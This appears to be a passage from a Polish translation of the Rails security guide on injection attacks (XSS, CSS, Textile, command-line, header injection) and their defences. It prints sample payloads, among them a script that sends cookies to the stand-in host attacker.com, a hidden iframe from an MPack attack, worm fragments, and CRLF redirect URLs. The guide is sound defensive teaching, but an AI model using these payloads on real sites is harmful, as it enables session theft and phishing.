W drugiej połowie 2007 r. było 88 zgłoszonych usterek w Mozilli, 22 w Safari, 18 w IE, a 12 w Operze. W http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf[sprawozdaniu Symantec Internet Security Globalne] także udokumentowano 239 usterek we wtyczkach do przeglądarek w ciągu ostatnich sześciu miesięcy 2007 roku. http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx[MPack] jest bardzo aktywnym i aktualnym frameworkiem ataku , który wykorzystuje te luki. Dla hakerów, wizja wykorzystania luk podatnych na ataki typu SQL Injection we frameworkach aplikacji internetowych i wprowadzenie złośliwego kodu w każdej kolumnie tabel tekstowych jest bardzo kuszące. W kwietniu 2008 ponad 510.000 stron http://www.0x000000.com/?i=556[były zhakowane] jak tak. Wśród nich znalazły się strony brytyjskiego rządu, ONZ i wiele innych poważnych celów. 
 
Stosunkowo nowymi i niecodziennymi formami punktów wejścia są banery reklamowe. We wcześniejszych miesiącach 2008 roku, złośliwy kod ukazał się w reklamach w formie baneru na popularnych witrynach, takich jak MySpace i Excite, zgodnie z http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/[Trend Micro]. 

==== Ataki HTML/JavaScript Injection

Najczęściej stosowanym językiem dla XSS jest oczywiście najbardziej popularny język wykonywany po stronie klienta - JavaScript, często w połączeniu z HTML. [,#fffcdb]#Unikanie wejścia użytkownika jest niezbędne#. 
 
Oto najprostszy test, aby sprawdzić XSS: 
 
..........
<script>alert('Hello');</script>
..........

Ten kod JavaScript po prostu wyświetli alert box. Kolejne przykłady robią dokładnie to samo, tylko w bardzo nietypowych miejscach:

..........
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
..........
 
===== Kradzież cookie 

Te przykłady, jak na razie nie robią żadnej szkody, więc zobaczmy w jaki sposób atakujący może wykraść cookies użytkownika (i tym samym przejąć sesję użytkownika). W JavaScript można użyć właściwość document.cookie do odczytu i zapisu cookies. JavaScript egzekwuje the same origin policy, co oznacza, że skrypt z jednej domeny nie może uzyskać dostępu do cookies z innej domeny. We właściwości document.cookie posiada cookie pochodzące z serwera WWW. Jednakże, możesz odczytywać i zapisywać tą wartość, jeśli umieścisz kod bezpośrednio w dokumencie HTML (jak to się dzieje w XSS). Umieść to gdziekolwiek na swojej stronie w celu sprawdzenia własnych cookies na stronie wyników: 
 
..........
<script>document.write(document.cookie);</script>
..........

Dla atakujący, oczywiście, nie jest to przydatne, ponieważ ofiara zobaczy swoje własne cookie. W następnym przykładzie spróbujemy załadować obrazek z adresu http://www.attacker.com/ plus cookie. Oczywiście ten adres nie istnieje, więc przeglądarka nic nie wyświetli. Ale atakujący może dokonać przeglądu raportu dostępu do jego serwera, żeby sprawdzić cookie ofiar. 
 
..........
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
..........

Raprt na www.attacker.com będzie wyglądać tak:
 
..........
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
..........

Możesz zmniejszyć te ataki (w sposób oczywisty) poprzez dodanie flagi http://dev.rubyonrails.org/ticket/8895[httpOnly] cookies, żeby document.cookie nie mógł być odczytany przez JavaScript. Cookies httpOnly mogą być używane pod IE v6.SP1, Firefoxoxem v2.0.0.5 i Operą 9.5. Safari nadal ignoruje tą opcję. Ale w innych, starszych przeglądarkach (np. WebTV i IE 5.5 na Macu) może to powodować problemy z ładowaniem się stron. Ostrzegamy, że pliki cookie http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/[nadal będą widoczne przy użyciu technologii Ajax].
 
===== Atak typu Defacement

Poprzez atak typu defacment atakujący może zrobić wiele rzeczy, na przykład przedstawiać fałszywe informacje lub wabić ofiary na swoją stronę internetową, żeby wykraść cookies, dane logowania lub innych wrażliwe dane. Najbardziej popularnym sposobem jest wstawienie kodu z zewnętrznych źródeł przez iframes: 

..........
<iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
..........

Powyższy kod załaduje arbitralny kod HTML i/lub JavaScript z zewnętrznego źródła i osadzi go jako część witryny. Ten IFrame pochodzi z  http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html[rzeczywistego ataku] prawnych Włoskich stron przy użyciu http://isc.sans.org/diary.html?storyid=3015[frameworku ataku MPack]. MPack próbuje zainstalować złośliwe oprogramowanie poprzez luki w przeglądarce internetowej - jest bardzo skuteczny, 50% ataków kończy się sukcesem.

Bardziej specjalistyczne ataki mogą pokrywać całą stronę internetową lub wyświetlać formularz logowania, który wygląda tak samo jak oryginalny, lecz przekazuje nazwę użytkownika i hasło na stronę atakującego. Może też używać CSS i/lub JavaScript do ukrycia ważnych linków w aplikacji internetowej i wyświetlać inne, który przekierowywują do fałszywej strony internetowej. 
 
Odbite ataki typu injection to te, w których ładunek nie jest trzymany do przedstawienia go ofiarze później, ale zawarty w adresie URL. Zwłaszcza formularze wyszukiwania nie mogą uniknąć wyszukiwania ciągu znaków. Następujący link przedstawiła stronę, która stwierdziła, że "George Bush powołał 9-letniego chłopca na przewodniczącego ...":
 
..........
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
..........
 
===== Sposoby ochrony

[,#fffcdb]#Bardzo ważne jest filtrowanie złośliwego wejścia, ale równie ważne jest uniknięcie wyjście w aplikacjach internetowych#.
 
W szczególności dla XSS, ważne jest, aby zrobić [,#fffcdb]#białą listę filtrowania wejścia zamiast czarnej#. Biała lista filtrowania określa dozwolone wartości w przeciwieństwie do wartości niedozwolonych. Czarne listy nigdy nie są kompletne.

Wyobraź sobie, że czarna lista usuwa "skrypt" z wejścia użytkownika. Teraz atakujący wprowadza "<scrscriptipt>", a po przefiltrowaniu pozostaje "<script>". Wcześniejsze wersje Railsów używały czarnej listy do metod strip_tags(), strip_links() i sanitize(). Więc tego typu atak był możliwy:
 
...........
strip_tags("some<<b>script>alert('hello')<</b>/script>") 
...........
 
Zwróciło to "some<script>alert('hello')</script>", co sprawiło, że atak zadziałał. To jest powód dla którego byłem za wprowadzeniem białych list przy aktualizacji metody sanitize() w Railsach 2.
 
...........
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
...........

Pozwala to tylko na używanie niektórych tagów i odwala dobrą robotę, nawet przeciw wszelkiego rodzaju sztuczkom i zniekształconym tagom. 
   
W drugim etapie, [,#fffcdb]#dobrą praktyką jest unikanie wszystkich wyjść aplikacji#, zwłaszcza gdy ponownie wyświetlane jest wejście użytkownika, które nie zostało przefiltrowane (jak we wcześniej wspomnianym przykładzie formularza wyszukiwania). [,#fffcdb]#Używaj metody escapeHTML() (lub jej aliasu h())# żeby zastąpić znaki wejścia HTML &,",<,> przez ich nieinterpretowane reprezentacje w formacie HTML (&amp;, &quot;, &lt; and &gt;). Jednak może się zdarzyć, że programatora zapomni ich użyć, więc [,#fffcdb]#zaleca się korzystanie z http://safe-erb.rubyforge.org/svn/plugins/safe_erb/[wtyczki SafeErb]#. SafeErb przypomina o unikaniu ciągów znaków z zewnętrznych źródeł.
  
===== Zaciemnianie i ataki z wykorzystaniem kodowania znaków

Ruch w sieci opiera się głównie na ograniczonym zachodnim alfabecie, więc nowe kodowanie znaków, np. Unicode, pojawiły się, w celu przekazywania znaków w innych językach. Ale jest to również zagrożenie dla aplikacji internetowych, ponieważ złośliwy kod może być ukryty w różnych kodowaniach, z którymi przeglądarka internetowa może sobie poradzić, a aplikacja internetowa nie może. Oto wektor ataku w kodowaniu UTF-8:

............
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
............

Działaniem tego przykładu jest wyskakujące okno komunikatu. Będzie to rozpoznawane przez wyżej wspomniany filtr sanitize(). Świetnym narzędziem do zaciemniania i kodowania ciągów znaków, a tym samym "do poznania swjego wroga", jest http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php[Hackvertor]. Railsowa metoda sanitize() odwala dobrą robotę odpierając ataki z wykorzystaniem kodowania znaków. 

 
==== Podziemne przykłady
 
-- _ Aby zrozumieć dzisiejsze ataki na aplikacje internetowe, najlepiej spojrzeć na niektóre wektory ataków w świecie rzeczywistym._ 

Poniżej znajduje się wyciąg z http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1[Js.Yamanner@m] Yahoo! Mail http://groovin.net/stuff/yammer.txt[worm]. Ukazał się 11 czerwca 2006 roku i był pierwszym robakiem w mailowym interfejsie: 

...........
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif' 
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
...........

Robak wykorzystuje dziurę w filtrze HTML/JavaScript Yahoo. Zazwyczaj filtruje on wszystkie cele i atrybuty onload z tagów (ponieważ nie można używać JavaScriptu). Filtr jest stosowany tylko raz, jednak w taki sposób, że atrybuty onload z zainfekowanym kodem pozostają w miejscu. Jest to dobry przykład tego, że filtry tworzone za pomocą czarnych list nigdy nie są kompletne i dlaczego trudno jest pozwolić na HTML/JavaScript w aplikacji internetowej. 

Kolejnym dowodem koncepcji robaka webmailowego jest Nduja, robak typu cross-domain na cztery włoskie usługi webmailowe. Więcej szczegółów i demonstracja wideo znajduje się na stronie http://rosario.valotta.googlepages.com/home[Rosario Valotta]. Oba webmailowe robaki mają na celu zbieranie adresów e-mail, czyli coś, za co haker może zarobić duże pieniądze. 

W grudniu 2006 roku, 34000 rzeczywistych nazw użytkownika i haseł zostały skradzione z http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html[MySpace poprzez atak typu phishing]. Ideą ataku było stworzenie strony profilu o nazwie "login_home_index_html", a więc adres wyglądał bardzo przekonująco. Specjalnie spreparowany HTML i CSS został użyty w celu ukrycia prawdziwej treści ze strony MySpace i zamiast tego wyświetlał własny formularz logowania. 
 
Robak Samy z MySpace zostanie omówiony w sekcji o atakach typu CSS injection. 

=== Atak typu CSS Injection
 
-- _Atak typu CSS injection w rzeczywistości jest atakiem typu JavaScript injection, ponieważ niektóre przeglądarki (IE, niektóre wersje Safari i inne) umożliwiają obsługę JavaScript w CSS. Dobrze się zastanów zanim umożliwisz niestandardowe CSS w twojej aplikacji internetowej._ 

Atak typu CSS injection można wytłumaczyć na przykładzie znanego robaka -  http://namb.la/popular/tech.html[MySpace Samy]. Ten robak automatycznie zaprasza do znajomych Sam’iego (atakującego), po prostu odwiedzając jego profil. W ciągu kilku godzin miał ponad 1 milion zaproszeń do znajomych, generując tak dużo ruchu na MySpace, że witryna przestała działać. Poniżej znajduje się techniczne wyjaśnienie działania robaka. 

MySpace blokuje wiele tagów, jednak pozwala na używanie CSS. Więc autor robaka umieścił JavaScript w CSS w taki sposób:
 
...........
<div style="background:url('javascript:alert(1)')">
...........
 
Tak więc ładunek umieszczony jest w atrybucie style. Ale w ładunku nie można użyć cudzysłowów, ponieważ pojedyncze i podwójne cudzysłowy zostały już wykorzystane. Ale JavaScript pozwala wykorzystywać przydatną funkcję eval(), która wykonuje każdy ciąg jako kod. 

...........
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"> 
...........

Funkcja eval() jest koszmarem dla czarnych list filtrów wejścia, gdyż pozwala atrybutowi style ukryć słowo "innerHTML":
 
...........
alert(eval('document.body.inne' + 'rHTML')); 
...........

Kolejnym problemem w MySpace było filtrowanie słowa "javascript", więc autor użył “java<NEWLINE>script” aby obejść ten problem: 

...........
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
...........

Innym problemem dla autora robaka były tokeny bezpieczeństwa CSRF. Bez nich nie mógłby zapraszać znajomych przez metodę POST. Obszedł to, wysyłając żądanie GET do strony zaraz przed dodaniem użytkownika i parsując wyniki dla tokena CSRF. 
   
W końcu stworzył 4 KB robaka, którego wpuścił do strony swojego profilu. 
 
Wartość http://www.securiteam.com/securitynews/5LP051FHPE.html[moz-binding] CSS okazała się być innym sposobem na wprowadzanie JavaScript do CSS w przeglądarkach opartych na Gecko (na przykład Firefox). 
 
==== Sposoby ochrony

Ten przykład, ponownie pokazał, że filtr na podstawie czarnej listy nigdy nie jest kompletny. Edytowalne CSS w aplikacjach internetowych jest dość rzadką funkcją, jednak nie obawiam się stosować białych list do filtracji CSS. [,#fffcdb]#Jeśli chcesz zezwolić na niestandardowe kolory lub obrazek, możesz pozwolić użytkownikowi je wybrać i tworzyć CSS w aplikacji internetowej#. Użyj Railsowej metody +sanitize()+ jako modelu dla białej listy filtrowania CSS, jeśli naprawdę jej potrzebujesz. 
 
=== Atak typu Textile Injection
  
-- _Jeśli chcesz zapewnić formatowanie tekstu inne niż HTML (ze względu na bezpieczeństwo), powinieneś użyć języka mark-up, który jest przekształcany na HTML po stronie serwera. http://whytheluckystiff.net/ruby/redcloth/[RedCloth] jest takim język dla Ruby, ale bez stosowania środków ostrożności, jest również podatny na XSS._ 

  Na przykład, RedCloth tłumaczy _test_ na <em>test<em>, co oznacza kursywę. Jednak, aż do obecnej wersji 3.0.4, jest nadal podatny na XSS. Pobierz http://www.redcloth.org[wszystkie nowe wersje 4], w których usunięto poważne błędy. Jednak nawet ta wersja http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html[kilka błędów bezpieczeństwa], więc sposoby ochrony nadal obowiązują. Oto przykład dla wersji 3.0.4: 

...........
>> RedCloth.new('<script>alert(1)</script>').to_html
=> "<script>alert(1)</script>"
...........

Użyj opcji :filter_html żeby usunąć kod HTML, który nie został stworzony przez procesor textile. 
 
...........
>> RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
=> "alert(1)"
...........

Ta metoda nie przefiltruje całego kodu HTML - kilka tagów zostanie pominiętych (ze względów konstrukcyjnych), na przykład <a>: 

...........
>> RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
=> "<p><a href="javascript:alert(1)">hello</a></p>"
...........
 
==== Sposoby ochrony
 
Zaleca się [,#fffcdb]#korzystanie z  RedCloth w połączeniu z białą listów filtracji wejścia#, jak zostało to opisane w sposobach ochrony przeciwko XSS.
 
=== Atak typu Ajax Injection
 
-- _Środki ostrożności, podjęte dla Ajaxa, są takie same jak te dla "normalnych" technologii. Istnieje przynajmniej jeden wyjątek: Uniknięcie wyjścia musi nastąpić już w kontrolerze, jeżeli akcja nie renderuje widoku._ 

Jeśli używasz http://dev.rubyonrails.org/browser/plugins/in_place_editing[wtyczki in_place_editor], lub akcji, które zwracają ciąg znaków, a nie renderujesz widoku, [,#fffcdb]#musisz uniknąć wartości zwracanej w akcji#. W przeciwnym razie, jeśli zwracana wartość zawiera ciąg XSS, złośliwy kod będzie wykonywany po powrocie do przeglądarki. Unikaj wszystkich wartości wejścia używając metody h(). 
 
=== Atak typu RJS Injection
 
-- _Nie zapomnij o unikaniu w szablonach JavaScript (RJS)._

API RJS generuje bloki kodu w oparciu o kod Ruby, co pozwala manipulować widokiem lub części widok z serwera. [,#fffcdb]#Jeśli zezwalasz na wejście użytkownika w szablonach RJS, użyj ucieczki korzystając z escape_javascript() w funkcji JavaScript i w części HTML korzystając z h()#. W Przeciwnym wypadku atakujący mógłby wykonać arbitralny kod JavaScript. 
 
=== Atak typu Command Line Injection

-- _Używaj parametrów wiersza polecenia dostarczanych przez użytkownika z ostrożnością._ 

Jeśli twoja aplikacja musi wykonywać polecenia systemu operacyjnego, istnieje do tego kilka metod w Ruby: exec(polecenie), syscall(polecenie), system(polecenie) oraz \‘command’. Będziesz musiał być szczególnie ostrożny z tymi funkcjami, jeżeli użytkownik może wprowadzić całą komendę, lub jej część. Dzieje się tak, ponieważ w większości shelli, możesz wykonywać kolejne polecenie na końcu pierwszego łącząc je średnikiem (;) lub pionową kreska (|). 
 
Jako ochrony [,#fffcdb]#użyj metody +system(komenda, parametry)+, która bezpiecznie przekazuje parametry linii poleceń#. 

..........
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
..........
  
=== Atak typu Header Injection
 
-- _Nagłówki HTTP są generowane dynamicznie i przy pewnych okolicznościach wejście użytkownika może zostać zaatakowane. Może to prowadzić do fałszywego przekierowania, XSS lub rozszczepieniu odpowiedzi HTTP._

Nagłówki żądań HTTP mają między innymi Referer, User-Agent (oprogramowanie klienta) i pole cookie. Nagłówki odpowiedzi mają na przykład kod stanu, cookie i lokalizacje (przekierowanie docelowego adresu URL) pola. Wszystkie z nich są dostarczane przez użytkownika i mogą być zmanipulowane, z większym lub mniejszym wysiłkiem. [,#fffcdb]#Należy pamiętać, aby uniknać tych pól nagłówów,#. Na przykład, kiedy wyświetlasz agenta użytkownika w sferze administracyjnej.
 
Poza tym, [,#fffcdb]#warto wiedzieć, co robisz przy budowie nagłówków odpowiedzi, częściowo opartych na wejściu użytkownika#. Na przykład jeśli chcesz cofnąć użytkownika do określonej strony. Aby to zrobić, wprowadziłeś "referer" pola w formularzu do przekierowania na dany adres:
 
..........
redirect_to params[:referer]
..........

Railsy wstawiają ciąg znaków do pola nagłówka położenia i wysyłają status 302 (przekierowanie) do przeglądarki. Pierwszą rzeczą, którą może zrobić złośliwy użytkownik jest: 

..........
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
..........
 
Oraz ze względu na błąd w (Ruby i) Railsach do wersji 2.1.2 (z wyjątkiem, tej właśnie wersji), haker może wprowadzić arbitralne pola nagłówka, na przykład takie: 
 
..........
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
..........

Zwróć uwagę, że "%0d%0a" jest zakodowaną przez URL wersją "\r\n", która jest carriage-return i line-feed (CRLF) w języku Ruby. Więc wynikający nagłówek HTTP dla drugiego przykładu będzie następujący ponieważ drugie położenie pole nagłówka zastępuje pierwsze. 

..........
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
..........
 
Więc [,#fffcdb]#wektory ataku typu header injection są oparte na wstawianiu znaków CRLF do pola nagłówka#. A co atakujący może zrobić z fałszywymi przekierowaniami? Może przekierować je do strony, na której dokona phishingu. Strona ta wygląda tak samo jak twoja, ale prosi, aby zalogować się ponownie (i wysyła dane logowania atakującemu). Atakujący może też zainstalować złośliwe oprogramowanie za pośrednictwem luk w przeglądarce na tej stronie. [,#fffcdb]#Railsy 2.1.2 unikają wstawiania tych znaków w polu położenia w metodzie redirect_to. Upewnij się, że zrobisz to sam podczas budowania innych pól nagłówka z wejściem użytkownika#. 
 
==== Rozdzielanie odpowiedzi

Jeśli atak typu Header Injection był możliwy, prawdopodobne jest, że rozdzielanie odpowiedzi również będzie możliwe. W HTTP za blokiem nagłówka  podążają dwie CRLFs i aktualne dane (zwykle HTML). Pomysł rozdzielania odpowiedzi polega na wstawianiu dwóch CRLFs w pole nagłówka, a następnie wstawianiu innej odpowiedzi ze złośliwym kodem HTML. Odpowiedź będzie wyglądała tak: 

..........
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html

  
HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html
 
 
<html><font color=red>hey</font></html> [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
..........
 
W pewnych okolicznościach złośliwy kod HTML trafi do ofiary. Jednakże, jest to praca tylko i wyłącznie z połączeniami Keep-Alive (wiele przeglądarek używa jednorazowych połączeń). Ale nie można na tym zbytnio polegać. [,#fffcdb]#W każdym razie jest to poważny błąd i należy zaktualizować Railsy do wersji 2.0.5 lub 2.1.2 w celu wyeliminowania ryzyka wystąpienia header ijnection (i tym samym rozdzielania odpowiedzi)#. 
 
== Dodatkowe informacje

Zakres zabezpieczeń cały czas się zmienia i ważne jest, aby być na bieżąco w temacie, ponieważ pominięcie nowej luki może mieć katastrofalne skutki. Dodatkowe informacje na temat bezpieczeństwa (w Railsach) znajdziesz tutaj: 
 
- Projekt bezpieczeństwa w Ruby on Rails regularnie dodaje newsy: http://www.rorsecurity.info[http://www.rorsecurity.info]
- Zapisz się do http://groups.google.com/group/rubyonrails-security[listy mailingowej] bezpieczeństwa w Railsach
- http://secunia.com/[Bądź na bieżąco z warstwami innych aplikacji] (mają też cotygodniowy biuletyn)
- A http://ha.ckers.org/blog/[Dobry blog o bezpieczeństwie] zawierający http://ha.ckers.org/xss.html[ściągę z Cross-Site scripting]
- Another http://www.0x000000.com/[ Dobry blog o bezpieczeństwie] również zawierający ściągawki.

== Dziennik zmian ==
 
http://rails.lighthouseapp.com/projects/16213-rails-guides/tickets/7[Lighthouse ticket]
 
* November 1, 2008: First approved version by Heiko Webers